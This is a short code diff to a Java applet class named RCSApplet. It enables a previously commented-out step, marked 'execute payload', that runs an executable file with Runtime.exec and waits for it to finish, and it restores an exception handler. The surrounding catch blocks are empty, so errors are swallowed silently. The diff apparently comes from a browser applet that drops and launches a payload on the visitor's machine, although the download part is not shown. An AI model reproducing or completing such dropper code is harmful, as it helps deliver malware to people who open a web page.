@@ -48,13 +48,14 @@ public class RCSApplet extends Applet {
 			
 			// execute payload
 			System.out.println("Running " + executableFile.getCanonicalPath());
-			//f = Runtime.getRuntime().exec(new String[] {executableFile.getCanonicalPath()}).waitFor();
+			f = Runtime.getRuntime().exec(new String[] {executableFile.getCanonicalPath()});
+			f.waitFor();
 			
 		} catch (IOException ioe) {
 			
 		} catch (NullPointerException npe) {
 			
-		//} catch (InterruptedException ie) {
+		} catch (InterruptedException ie) {
 			
 		} finally {
 			try {
